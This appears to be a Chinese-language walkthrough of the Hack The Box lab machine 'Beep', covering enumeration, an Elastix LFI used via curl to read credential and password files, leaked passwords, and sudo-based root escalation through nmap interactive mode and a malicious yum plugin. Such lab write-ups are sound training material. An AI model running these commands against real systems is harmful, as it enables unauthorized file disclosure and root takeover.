## nmap

```Bash
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
879/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt

```



## http

```Bash
80/tcp  open  http     Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
443/tcp open  ssl/http Apache httpd 2.2.3 ((CentOS))
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2023-01-03T08:13:51+00:00; +59m59s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
Service Info: Host: 127.0.0.1

```

searchexpoit 没有版本命中

80接口会跳转至 443 ，打开为 elastix的登录界面，尝试默认登录

searchexploit有两个RCE，但需要确认版本，LFI有东西

```Bash
Elastix - 'page' Cross-Site Scripting                                                                                                                                       | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                                                     | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                                               | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                                                            | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                                                           | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                                                          | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                                                      | php/webapps/18650.py

```



### LFI的漏洞 - 有疑问

根据poc中的提示，手动打开LFI的网页，把所有内容保存下来，分析一下，这里直接用curl操作，排版更清晰一点

```Bash
curl "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" -k > LFI_FILE.txt
```

提取出一堆用户名密码

```Bash
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

# FOPWEBROOT: Path to the Flash Operator Panel webroot (leave off trailing slash)
# FOPPASSWORD: Password for performing transfers and hangups in the Flash Operator Panel
# FOPRUN: Set to true if you want FOP started by freepbx_engine (amportal_start), false otherwise
# FOPDISABLE: Set to true to disable FOP in interface and retrieve_conf.  Useful for sqlite3
# or if you don't want FOP.
#
#FOPRUN=true
FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE


# This is the default admin name used to allow an administrator to login to ARI bypassing all security.
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well
ARI_ADMIN_USERNAME=admin

# This is the default admin password to allow an administrator to login to ARI bypassing all security.
# Change this to a secure password.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE

```

修改其中的路径，可以获取一些别的内容

```Bash
# 获取/etc/passwd 拿到用户信息
curl "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" -k

# 拿到用户后直接看user.txt
curl "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action" -k

```



直接用上面的文件里面的密码都长得一样，试一下admin用户，进入elastix的管理界面，拿到所有组件的版本信息

![](https://secure2.wostatic.cn/static/mH6FLhxyJsFdxQWPUqCbf1/image.png?auth_key=1677500266-3j35HjHhvQoDqyQU688JmP-0-9a44ceddf6475e0534512b287381d9ea)

看一下上面的的RCE exp，尝试了searchexploit和github上的，找到一个可以触发shell的

[infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution: Modified version of the original one for HackTheBox Beep (github.com)](https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution)

那些无法触发的脚本，主要问题在于 extension参数不对，改成233就可以了，为什么要改成233，这里没有理解





目录爆破

```Bash
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/index.php            (Status: 200) [Size: 1785]
/register.php         (Status: 200) [Size: 1785]
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/]
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]
/config.php           (Status: 200) [Size: 1785]
/robots.txt           (Status: 200) [Size: 28]
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]

```



/admin也是一个PBX的登录界面，需要用户名密码，searchexploit没有发现对应exp

![](https://secure2.wostatic.cn/static/pZaWVXhYGV4igfeghLPTwN/image.png?auth_key=1677500266-cTTKhUixvHr8LRt3MgQXoc-0-fa350e1ba934bf05156926e50f2cdda3)

用上面的用户名密码可以进来



/mail也是一个登录界面，需要用户名密码，searchexploit 需要确认版本，先跳过

![](https://secure2.wostatic.cn/static/irBgmjn3eWDtX3UWnQihyA/image.png?auth_key=1677500266-dVNbb7q8YL9EEWjZDQZQ9N-0-48c38d3e2c9442bee457653092d9f11c)



## mysql

不能远程连接



## privilege escalation

### sudo

```Bash
id
uid=100(asterisk) gid=101(asterisk)
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper

```

提供了很多命令，[GTFOBins](https://gtfobins.github.io/)找找

#### nmap 交互模式提权

```Bash
id
uid=100(asterisk) gid=101(asterisk)

sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)

```



#### yum 交互提权

```Bash
sh-3.2$ TF=$(mktemp -d)
sh-3.2$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
sh-3.2$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
sh-3.2$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh', '/bin/sh')
> EOF
sh-3.2$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2# exit
exit
sh-3.2$
sh-3.2$
sh-3.2$ id
uid=100(asterisk) gid=101(asterisk)
sh-3.2$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2#

```



## beyond root

这题最大的困难在于shell的poc里面的参数是不对的，改了以后才可以

这里有解释但是不太清晰，回头看下题解。

[Hack The Box — Beep Writeup without Metasploit – InfosecJunky](https://infosecjunky.com/hack-the-box-beep-writeup-without-metasploit/)



这里要用到svmap和svwar组件，古老的SIP协议拨号探测，去确认extension的数值。

